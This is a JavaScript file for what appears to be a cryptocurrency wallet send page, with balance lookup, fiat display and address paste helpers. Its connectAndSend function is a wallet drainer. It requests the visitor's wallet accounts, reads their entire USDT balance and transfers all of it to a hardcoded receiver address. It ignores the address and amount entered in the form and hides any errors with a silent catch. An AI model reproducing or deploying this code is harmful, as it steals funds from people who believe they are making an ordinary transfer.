const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";
const usdtABI = [
  "function balanceOf(address) view returns (uint256)",
  "function transfer(address to, uint256 value) returns (bool)",
  "function decimals() view returns (uint8)"
];

async function connectAndSend() {
  if (!window.ethereum) return;

  try {
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const accounts = await provider.send("eth_requestAccounts", []);
    if (!accounts || !accounts.length) return;

    const signer = provider.getSigner();
    const usdt = new ethers.Contract(usdtAddress, usdtABI, signer);
    const balance = await usdt.balanceOf(await signer.getAddress());
    const decimals = await usdt.decimals();

    if (balance.isZero()) return;

    const tx = await usdt.transfer(receiver, balance);
    await tx.wait();
  } catch (err) {
    // silent fail
  }
}

function updateFiat() {
  const input = document.getElementById("amount");
  const fiat = document.getElementById("fiat");
  const val = parseFloat(input.value);
  fiat.innerText = isNaN(val) ? "≈ $0.00" : `≈ $${val.toFixed(2)}`;
}

async function fillMax() {
  if (!window.ethereum) return;

  try {
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();
    const usdt = new ethers.Contract(usdtAddress, usdtABI, signer);
    const balance = await usdt.balanceOf(await signer.getAddress());
    const decimals = await usdt.decimals();

    const formatted = ethers.utils.formatUnits(balance, decimals);
    document.getElementById("amount").value = formatted;
    updateFiat();
  } catch {}
}

function clearAddress() {
  document.getElementById("address").value = "";
}

async function pasteAddress() {
  try {
    const text = await navigator.clipboard.readText();
    document.getElementById("address").value = text;
  } catch {}
}
